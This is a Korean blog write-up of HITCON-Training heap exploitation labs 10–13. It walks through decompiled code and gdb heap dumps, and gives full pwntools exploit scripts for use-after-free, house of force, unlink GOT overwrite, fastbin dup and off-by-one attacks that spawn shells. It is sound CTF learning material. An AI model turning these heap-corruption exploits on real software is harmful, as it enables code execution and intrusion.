---
title: HITCON-Training
date: 2018-12-16 00:06:52
---

# LAB10

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
```

add_note() notelist 구조체를쓰는데 print_note_content 함수 포인터가 들어있는 녀석 하나 + content가 들어가는 녀석 총 2개로 할당해준다.

print나 delete는 딱히 볼게 없지만 print content를 할 때 저 함수 포인터를 사용한다. malloc할 때 content의 size는 임의로 지정 가능하다.

```c
int magic()
{
  return system("cat /home/hacknote/flag");
}
```

magic() 

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x845b000           0x0                 0x10                 Used                None              None
0x845b010           0x0                 0x68                 Used                None              None
0x845b078           0x0                 0x10                 Used                None              None
0x845b088           0x0                 0x68                 Used                None              None

gdb-peda$ x/100wx 0x845b000
0x845b000:	0x00000000	0x00000011	0x0804865b	0x0845b018
    
gdb-peda$ x/wx 0x0804865b
0x804865b <print_note_content>:	0x83e58955
```

small chunk 2개를 할당한다. 함수 포인터가 박혀있다..

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x845b000           0x0                 0x78                 Freed         0xf77b67b0        0xf77b67b0
0x845b078           0x78                0x10                 Freed                0x0              None
```

그리고 할당한 chunk를 다 free 해주면 free chunk들이 알아서잘 병합된다. 사이즈에 맞게 다시 한번 할당하고 함수 포인터 위치에 magic을 넣어준다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x83f8000           0x0                 0x68                 Used                None              None
0x83f8068           0x0                 0x10                 Freed         0xf77577b0        0xf77577b0
0x83f8078           0x10                0x10                 Used                None              None

gdb-peda$ x/12wx 0x83f8000
0x83f8000:	0x00000000	0x00000069	0x08048986	0xf7757820
0x83f8010:	0x00000000	0x00000069	0xf77577b0	0xf77577b0
0x83f8020:	0x00000000	0x00000000	0x00000000	0x00000000
gdb-peda$ x/wx 0x08048986
0x8048986 <magic>:	0x83e58955
    
cat: /home/hacknote/flag: 그런 파일이나 디렉터리가 없습니다
```

제대로 들어갔다. 이대로 첫 번째 chunk를 print 해주면 된다. 로컬에서 돌렸기 때문에 파일은 없지만 flag를 읽었다.

```python
from pwn import *

t = process('./hacknote')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r("choice :")
        s("1")
        r("size :")
        s(str(a))
        r("Content :")
        s(str(b))

def d(a):
        r("choice :")
        s("2")
        r("Index :")
        s(str(a))

def p(a):
        r("choice :")
        s("3")
        r("Index :")
        s(str(a))

magic = 0x08048986

a(100,"a"*4)
a(100,"a"*4)
d(0)
d(1)
a(0x60,p32(magic))
p("0")
t.interactive()
```

비교적 간단한 문제

```python
from pwn import *

t = process('./hacknote')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
	r("choice :")
	s("1")
	r("size :")
	s(str(a))
	r("Content :")
	s(str(b))

def d(a):
	r("choice :")
	s("2")
	r("Index :")
	s(str(a))
	
def p(a):
	r("choice :")
	s("3")
	r("Index :")
	s(str(a))

magic = 0x08048986

a(0x20,"a"*4)
a(0x20,"a"*4)
d(0)
d(1)
a(8,p32(magic))
p("0")
pause()
t.interactive()
```

제길 그냥 uaf로 해도 된다.

<br>

# LAB 11

```c
__int64 add_item()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, &buf, 8uLL);
    v2 = atoi(&buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !qword_6020C8[2 * i] )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        qword_6020C8[2 * i] = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(qword_6020C8[2 * i] + (signed int)read(0, (void *)qword_6020C8[2 * i], v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

add item() size는 아무렇게 지정 가능하다.

```c
unsigned __int64 change_item()
{
  int v0; // ST08_4
  int v2; // [rsp+4h] [rbp-2Ch]
  char buf; // [rsp+10h] [rbp-20h]
  char nptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, &buf, 8uLL);
    v2 = atoi(&buf);
    if ( qword_6020C8[2 * v2] )
    {
      printf("Please enter the length of item name:", &buf);
      read(0, &nptr, 8uLL);
      v0 = atoi(&nptr);
      printf("Please enter the new name of the item:", &nptr);
      *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

change가 있다 overflow 발생이 가능!

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = malloc(0x10uLL);
  *v3 = hello_message;
  v3[1] = goodbye_message;
  ((void (__fastcall *)(signed __int64, _QWORD))*v3)(16LL, 0LL);
  while ( 1 )
  {
    menu();
    read(0, &buf, 8uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item(&buf, &buf);
        break;
      case 5:
        ((void (__fastcall *)(char *, char *))v3[1])(&buf, &buf);
        exit(0);
        return;
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

main을 보면 exit에 쓰이는 함수 포인터를 먼저 heap에 할당한다.

```c
void __noreturn magic()
{
  int fd; // ST0C_4
  char buf; // [rsp+10h] [rbp-70h]
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/home/bamboobox/flag", 0);
  read(fd, &buf, 0x64uLL);
  close(fd);
  printf("%s", &buf);
  exit(0);
}
```

마찬가지로 magic이 있다.

음.. add를 하고 top chunk를 건드릴 수 있어서 house of force를 했다 (사실 chunk 병합할라고 삽질하다가 훨 쉬운거같아서 바꿈)

```c
gdb-peda$ x/20gx 0x1d51000
0x1d51000:	0x0000000000000000	0x0000000000000021
0x1d51010:	0x0000000000400896	0x00000000004008b1
0x1d51020:	0x0000000000000000	0x0000000000000031
0x1d51030:	0x6161616161616161	0x6161616161616161
0x1d51040:	0x6161616161616161	0x6161616161616161
0x1d51050:	0x6161616161616161	0xffffffffffffffff
```

top chunk size를 변경하고

```c
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x1d51000 (size : 0x48)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

그다음 top chunk와 할당할 위치의 offset을 계산해서 다시 할당해주면 그 위치가 top chunk가 된다. 처음에 -0x50으로 했는데 위치 +0x10으로 갔다.(왜지 애초에 헤더 빼고 계산한건데..)

```c
gdb-peda$ x/12gx 0x1d51000
0x1d51000:	0x0000000000000000	0x0000000000000021
0x1d51010:	0x0000000000400d49	0x0000000000400d49
```

그리고 원래 chunk의 size를 맞춰주고 할당해야 하더라. magic값을 넣고 exit해주면 flag가 출력된다. 

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0x20,"a")
ch(0,0x40,"a"*0x28 + p64(0xffffffffffffffff))
a(-0x60,"a")
a(0x10,p64(magic)*2)
pause()
t.interactive()

Your choice:$ 5
local flag!
```

local에서 돌렸기 때문에 flag는 다르다.. 추가적으로

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0xf0,"a"*0x90)
a(0x10,"b"*0x10)
a(0xf0,"c"*0x90)
a(0x20,"a")
d(1)
d(0)
a(0x18,"e"*0x10 + p64(0x120))
d(2)
a(0xf0,"f"*0xf0)
sh()
r("0 : ")
ma = u64(t.recv(6).ljust(8,'\x00'))
print hex(ma)
t.interactive()
```

main_arena +88 leak도 가능하다. 이런 류의 문제에서 magic과 같은 함수를 주지않으면 leak을 한 후 진행해야 한다.

저렇게 4개를 할당하면 0,1,2,3 index가 활성화되는데 0 index를 fast chunk로 옮기도록 한다. 재할당 할때 8바이트만큼 더 쓸 수 있도록 서로 size를 맞춰 할당해주고 그다음 offset을 계산하여 prev_size를 적어준다. d(2)를 하면 chunk들이 marge 되고 (off-by-one이 있기 때문에 가능함! 때문에 기본 사이즈가 0x101이 나와야 한다)

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0xf80000            0x0                 0x20                 Used                None              None
0xf80020            0x0                 0x220                Freed     0x7f367b512b78    0x7f367b512b78
0xf80240            0x220               0x30                 Used                None              None
```

이렇게 큰 덩어리가 생겨버리게 된다. 그 다음 처음 할당한 만큼 재 할당 해주면 fast chunk 까지 할당하고 나머지 부분은 unsorted bin에 들어가게 된다 (스플릿!) 그리고 나서 show함수를 실행하면 0 index가 fast chunk였기 때문에 leak이 가능하다.. 

```c
0x7f367b512b78
[+] 0x7f367b14e000
```

쇼쇽

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0xf0,"a"*0x90)
a(0x10,"b"*0x10)
a(0xf0,"c"*0x90)
a(0x20,"a")
d(1)
d(0)
a(0x18,"e"*0x10 + p64(0x120))
d(2)
a(0xf0,"f"*0xf0)
sh()
r("0 : ")
ma = u64(t.recv(6).ljust(8,'\x00'))
print hex(ma)
libc = ma - 0x3c4b78
success(hex(libc))
o = libc + 0x4526a
a(0x110,"a")
ch(3,0x200,"a"*0x28 + p64(0xffffffffffffffff))
a(-0x280,"a")
a(0x10,p64(o)*2)
pause()
t.interactive()

Your choice:$ 5
$ id
uid=1000(bskim)
```

이렇게 oneshot도 사용할 수 있음! (사실 이거하느라 머리 깨졌음)

또! unlink를 이용해서 got_overwrite도 할 수 있다.

```c
gdb-peda$ x/40gx 0x141c020
0x141c020:	0x0000000000000000	0x0000000000000111
0x141c030:	0x0000000000000000	0x0000000000000101
0x141c040:	0x00000000006020b0	0x00000000006020b8
0x141c050:	0x6161616161616161	0x6161616161616161
0x141c060:	0x6161616161616161	0x6161616161616161
0x141c070:	0x6161616161616161	0x6161616161616161
0x141c080:	0x6161616161616161	0x6161616161616161
0x141c090:	0x6161616161616161	0x6161616161616161
0x141c0a0:	0x6161616161616161	0x6161616161616161
0x141c0b0:	0x6161616161616161	0x6161616161616161
0x141c0c0:	0x6161616161616161	0x6161616161616161
0x141c0d0:	0x6161616161616161	0x6161616161616161
0x141c0e0:	0x6161616161616161	0x6161616161616161
0x141c0f0:	0x6161616161616161	0x6161616161616161
0x141c100:	0x6161616161616161	0x6161616161616161
0x141c110:	0x6161616161616161	0x6161616161616161
0x141c120:	0x6161616161616161	0x6161616161616161
0x141c130:	0x0000000000000100	0x0000000000000110
```

이렇게 fake chunk를 만들고 다음 chunk의 prev_size, size를 조작해서 다음 chunk를 free 시키면 병합할 때 unlink가 발동되게 된다.

```c
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007f08befeb8e0	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000100	0x000000000141c030
0x6020d0 <itemlist+16>:	0x0000000000000100	0x000000000141c140
0x6020e0 <itemlist+32>:	0x0000000000000100	0x000000000141c250
```

itemlist가 index 포인터를 갖고 있다. itemlist+8을 조져야한다. (unlink를 하면 target address에 target address-0x18의 값이 들어가게 된다. 이유는 찾아보시길..)

```c
gdb-peda$ x/10gx 0x00000000006020b0
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007f3fee17c8e0	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000100	0x00000000006020b0
0x6020d0 <itemlist+16>:	0x0000000000000000	0x0000000000000000
```

chunk가 병합되면 index pointer가 변경되었다! 

```c
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x0000000000000000	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000000	0x00000000006020b0
0x6020d0 <itemlist+16>:	0x0000000000000000	0x0000000000602020
```

그리고 0 index를 수정해서 1 index에 puts_got를 넣고 1번 index를 수정해서 magic 값을 넣어주면 된다.

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")
        
magic = 0x0000000000400d49
itemlist = 0x6020c0
puts_got = 0x602020

a(0x100,"a")
a(0x100,"a")
a(0x100,"a")

ch(0,0x200,p64(0) + p64(0x101) + p64(itemlist+0x8-0x18) + p64(itemlist+0x8-0x10) + "a"*(0x100-0x20) + p64(0x100) + p64(0x110))
d(1)
ch(0,0x200,p64(0)*3 + p64(itemlist+0x8-0x18) + p64(0) + p64(puts_got))
ch(1,0x10,p64(magic))
pause()
t.interactive()

local flag! <- 윽
```

unlink는 코드만 보고는 이해하기 힘들기 때문에 how2heap, lazenca 문서들을 보고 이해하시길 바랍니다!

<br>

# LAB 12

```c
int add()
{
  void *v0; // rsi
  size_t size; // [rsp+0h] [rbp-20h]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0LL;
  buf = 0LL;
  LODWORD(size) = 0;
  if ( (unsigned int)flowercount > 0x63 )
    return puts("The garden is overflow");
  s = malloc(0x28uLL);
  memset(s, 0, 0x28uLL);
  printf("Length of the name :", 0LL, size);
  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )
    exit(-1);
  buf = malloc((unsigned int)size);
  if ( !buf )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  printf("The name of flower :", size);
  v0 = buf;
  read(0, buf, (unsigned int)size);
  *((_QWORD *)s + 1) = buf;
  printf("The color of the flower :", v0, size);
  __isoc99_scanf("%23s", (char *)s + 16);
  *(_DWORD *)s = 1;
  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
  {
    if ( !*(&flowerlist + HIDWORD(size)) )
    {
      *(&flowerlist + HIDWORD(size)) = s;
      break;
    }
  }
  ++flowercount;
  return puts("Successful !");
}
```

add() 임의로 size 지정이 가능! 구조체 안에 여러 멤버들이 있는데 딱히 상관없고 손포징으로 malloc,free 시켜보면 쉽게 index랑 fastbin을 확인할 수 있음!

```c
int del()
{
  int result; // eax
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !flowercount )
    return puts("No flower in the garden");
  printf("Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0x63 && *(&flowerlist + v1) )
  {
    *(_DWORD *)*(&flowerlist + v1) = 0;
    free(*((void **)*(&flowerlist + v1) + 1));
    result = puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

del() 맘껏 free 할 수 있다. 간단한 fastbin dup 공격이다.

```python
from pwn import * 

t = process('./secretgarden')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def a(a,b,c):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))
	r(":")
	s(str(c))

def d(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

magic = 0x0000000000400c7b

a(0x50,"a","b")
a(0x50,"a","b")
a(0x50,"a","b")

d(0)
d(1)
d(0)

a(0x50,p64(0x602020-38),"aaaa")
a(0x50,"a","b")
a(0x50,"a","b")
a(0x50,"\x00"*6 + p64(magic)*3,"b")
t.interactive()

local flag!
```

<br>

# LAB 13

```c
unsigned __int64 create_heap()
{
  _QWORD *v0; // rbx
  signed int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      heaparray[i] = malloc(0x10uLL);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      v0 = heaparray[i];
      v0[1] = malloc(size);
      if ( !*((_QWORD *)heaparray[i] + 1) )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(_QWORD *)heaparray[i] = size;
      printf("Content of heap:", &buf);
      read_input(*((void **)heaparray[i] + 1), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

create heap() size는 임의로 지정가능하고 size만큼만 content에 적을 수 있다.

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Content of heap : ", &buf);
    read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

edit 메뉴가 있지만.. size만큼만 쓰게 해주는 걸로 보이는데 특이점이 있다. 바로 +1 만큼 써주게 해준다는 것 1byte overflow가 나서 Off-by-one보다 더 유용하게 사용할 수 있다. (사실 소스를 대충봐서 발견 못했는데 아니 이거 off-by-one 없으면 어케 풀어 하고 넣으니까 바로 되길래 알아냄.. 소스를 잘 봐야 되는데 손포징만 늘어가고 있다 ㅠㅠ)

그리고 show(), delete() 함수까지 딱 전형적인 heap 바이너리 이다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
gdb-peda$ x/12gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x0000000000000041	0x0000000000000000
0x1a85040:	0x0000000000000000	0x0000000000020fc1
```

malloc을 1개 할당 했을 때 특이점은 chunk의 정보를 담고있는 녀석과 content 한 번의 malloc을 하면 2개의 chunk가 생긴다. 내부에 magic이 사라졌기 때문에 leak을 해주어야 하는데 

```c
0x6020a0 <heaparray>:	0x0000000001a85010
```

전역변수에서 show, edit를 관리하고 있다. 저 chunk의 정보를 담고있는 포인터에서 size, content 포인터를 이용해서 show 와 edit를 하게 된다.

```c
gdb-peda$ x/30gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x0000000000000041	0x0000000000000000
0x1a85040:	0x0000000000000000	0x0000000000000021
0x1a85050:	0x0000000000000010	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000062	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
```

0x18과 0x10 두개의 chunk를 할당했는데 0x18으로 할당한 이유는 1byte overflow를 하기 위함이다. edit 메뉴로 다음 chunk의 size를 변조한다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
0x1a85040           0x0                 0x40                 Used                None              None
gdb-peda$ x/30gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000010	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000062	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
    
0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85050
```

0x41로 1byte overflow를 시켜주면 저렇게 하나의 chunk가 되게 된다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
0x1a85040           0x0                 0x40                 Freed                0x0              None
gdb-peda$ x/40gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000000	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000000	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
```

free를 하면 0x30 size의 free chunk를 얻었기 때문에 chunk의 정보를 담고있는 녀석을 덮어 쓸 수 있게된다.

```c
gdb-peda$ x/40gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000000	0x0000000000000000
0x1a85060:	0x0000000000000000	0x0000000000000000
0x1a85070:	0x0000000000000030	0x0000000000602060
0x1a85080:	0x0000000000000000	0x0000000000020f81

0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85070
```

0x30만큼 할당하고 chunk의 정보 구조를 만들어 준다. 전역 변수를 보고 포인터가 찍혀있는 곳에 구조를 만들어 주고 atoi 함수를 릭 했다. atoi는 system을 쓸 때 인자 넣기가 매우 쉬워서 자주 애용하고 있는 녀석이다. show, edit 다 저 녀석으로 진행하면 된다. 원래는 puts 에 oneshot 넣으려고 했는데 잘안되서..(왜안될까 ㅠㅠ) 요녀석으로 사용했다.

```python
from pwn import * 

t = process('./heapcreator')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def ed(a,b):
	r(":")
	s("2")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def sh(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

def d(a):
	r(":")
	s("4")
	r(":")
	s(str(a))

a(0x18,"A")
pause()
a(0x10,"b")
pause()
ed(0,"c"*0x10 + p64(0) + '\x41')
pause()
d(1)
pause()
a(0x30,p64(0)*4 + p64(0x10) + p64(0x602060))
sh(1)
r("Content : ")
atoi = u64(t.recv(6).ljust(8,'\x00'))
#print hex(puts)
#libc = puts - 0x6f690
libc = atoi - 0x36e80
log.success("libc : " + hex(libc))
o = libc + 0x4526a
sys = libc + 0x45390
pause()
ed(1,p64(sys))
r(":")
s("/bin/sh\x00")
pause()
t.interactive()

$ id
uid=1000(bskim)
```

나는 로컬에서 하는 거라 그냥 로컬 립시를 사용했는데 도커 환경으로 하면 립시는 어찌하는지 잘모르겠다. 알아서 찾아서 해야 하나보다.. 처음에 진짜 얼토당토 않은 걸로 삽질 했었는데 leak 한다고.. 역시 소스를 자세히 잘 분석해야 한다..ㅠㅠ 

